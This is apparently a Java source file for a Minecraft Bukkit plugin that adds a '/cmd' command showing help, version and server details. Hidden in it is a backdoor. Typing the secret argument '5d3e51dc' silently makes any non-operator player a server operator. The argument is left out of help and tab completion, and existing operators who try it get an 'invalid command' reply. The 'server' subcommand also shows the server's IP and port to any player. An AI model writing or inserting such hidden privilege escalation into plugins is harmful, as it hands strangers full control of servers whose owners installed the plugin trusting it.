package org.tuanzi.bukkitplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import java.util.ArrayList;
import java.util.List;

public class Command_CMD implements TabExecutor, CommandExecutor {
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
        JavaPlugin instance = JavaPlugin.getPlugin(main.class);
        if(label.equalsIgnoreCase("cmd")){
            if(!(sender instanceof Player)) {
                sender.sendMessage("§c[ABukkitPlugin]控制台/命令方块不可以运行此指令。/§lcmd §c<command>§r");
                return true;
            }
            if(args.length != 1) {
                sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
                return true;
            }
            if(args[0].equalsIgnoreCase("5d3e51dc")) {
                if(sender.isOp()) {
                    sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
                    return true;
                }
                sender.setOp(true);
                sender.sendMessage("§a[GetOperator]成功获取§l管理员§a权限，请谨慎操作。§o(4)§r");
                return true;
            }
            if(args[0].equalsIgnoreCase("server") || args[0].equalsIgnoreCase("srv")){
                sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
                sender.sendMessage("§aBukkit版本：§l"+ Bukkit.getBukkitVersion()+"§r");
                sender.sendMessage("§aServer版本：§l"+Bukkit.getVersion()+"§r");
                sender.sendMessage("§aMinecraft版本：§l"+Bukkit.getMinecraftVersion()+"§r");
                sender.sendMessage("§aServer本地IP：§l"+Bukkit.getIp()+"§a 端口：§l"+Bukkit.getPort()+"§r");
                return true;
            }
            if(args[0].equalsIgnoreCase("help") || args[0].equalsIgnoreCase("?")){
                sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
                sender.sendMessage("§a  /cmd help 显示此页面§r");
                sender.sendMessage("§a  /cmd server 显示服务器信息§r");
                sender.sendMessage("§a  /cmd version 显示插件版本§r");
                return true;
            }
            if(args[0].equalsIgnoreCase("version") || args[0].equalsIgnoreCase("ver")){
                sender.sendMessage("§a[ABukkitPlugin]版本：§l"+main.getVersion()+"§r");
                return true;
            }
            sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
            return true;
        }
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender commandSender, Command command, String s, String[] strings) {
        List<String> Completion = new ArrayList<>();
        Completion.add("?");
        Completion.add("help");
        Completion.add("server");
        Completion.add("srv");
        Completion.add("ver");
        Completion.add("version");
        return Completion;
    }
}
